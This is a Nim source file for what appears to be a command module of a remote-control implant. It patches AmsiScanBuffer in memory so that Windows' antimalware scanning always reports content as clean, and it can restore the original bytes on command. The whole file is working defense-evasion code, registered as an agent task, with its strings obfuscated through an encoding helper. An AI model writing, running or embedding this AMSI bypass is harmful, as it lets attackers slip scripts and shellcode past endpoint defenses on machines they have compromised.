## amsi — patch/unpatch AmsiScanBuffer in the current process (Windows only).
## Patching bypasses AMSI scanning of in-memory content (scripts, shellcode, etc.).
## Use 'unpatch' to restore original bytes.
import std/[json, strutils]
import core/types
import commands/registry
import crypto/strenc

when defined(windows):
  type
    HANDLE = int
    DWORD  = uint32
    LPVOID = pointer
    SIZE_T = uint
    BOOL   = int32

  const PAGE_EXECUTE_READWRITE = DWORD(0x40)

  proc LoadLibraryA(lpLibFileName: cstring): HANDLE
    {.importc: "LoadLibraryA", dynlib: "kernel32".}
  proc GetProcAddress(hModule: HANDLE, lpProcName: cstring): LPVOID
    {.importc: "GetProcAddress", dynlib: "kernel32".}
  proc VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T,
                      flNewProtect: DWORD, lpflOldProtect: ptr DWORD): BOOL
    {.importc: "VirtualProtect", dynlib: "kernel32".}

  var amsiOrigBytes: array[3, byte]
  var amsiPatched   = false
  var amsiAddr: LPVOID = nil

  proc patchAmsi(): string =
    if amsiPatched: return hidstr("AmsiScanBuffer already patched")
    let h = LoadLibraryA(hidstr("amsi.dll").cstring)
    if h == 0: return hidstr("Error: amsi.dll not loaded in this process")
    let p = cast[ptr array[3, byte]](GetProcAddress(h, hidstr("AmsiScanBuffer").cstring))
    if p == nil: return hidstr("Error: AmsiScanBuffer not found")
    amsiAddr = cast[LPVOID](p)
    amsiOrigBytes = p[]
    var old: DWORD
    if VirtualProtect(amsiAddr, SIZE_T(3), PAGE_EXECUTE_READWRITE, addr old) == 0:
      return hidstr("Error: VirtualProtect failed")
    p[][0] = 0x33'u8   # xor eax,eax
    p[][1] = 0xC0'u8
    p[][2] = 0xC3'u8   # ret  → always returns AMSI_RESULT_CLEAN (0)
    discard VirtualProtect(amsiAddr, SIZE_T(3), old, addr old)
    amsiPatched = true
    return hidstr("AmsiScanBuffer patched (xor eax,eax; ret) — AMSI disabled")

  proc unpatchAmsi(): string =
    if not amsiPatched or amsiAddr == nil:
      return hidstr("AmsiScanBuffer not patched")
    let p = cast[ptr array[3, byte]](amsiAddr)
    var old: DWORD
    if VirtualProtect(amsiAddr, SIZE_T(3), PAGE_EXECUTE_READWRITE, addr old) == 0:
      return hidstr("Error: VirtualProtect failed")
    p[] = amsiOrigBytes
    discard VirtualProtect(amsiAddr, SIZE_T(3), old, addr old)
    amsiPatched = false
    return hidstr("AmsiScanBuffer restored — AMSI re-enabled")

proc amsiExecute(taskId: string, params: JsonNode, state: AgentState,
                 send: SendMsg): TaskResult =
  when not defined(windows):
    return TaskResult(output: hidstr("amsi is Windows-only"),
                      status: "error", completed: true)
  else:
    let action = params{"action"}.getStr("patch")
    let msg = if action == "unpatch": unpatchAmsi() else: patchAmsi()
    return TaskResult(
      output:    msg,
      status:    if msg.startsWith("Error"): "error" else: "success",
      completed: true,
    )

proc initAmsi*() =
  register(hidstr("amsi"), amsiExecute)
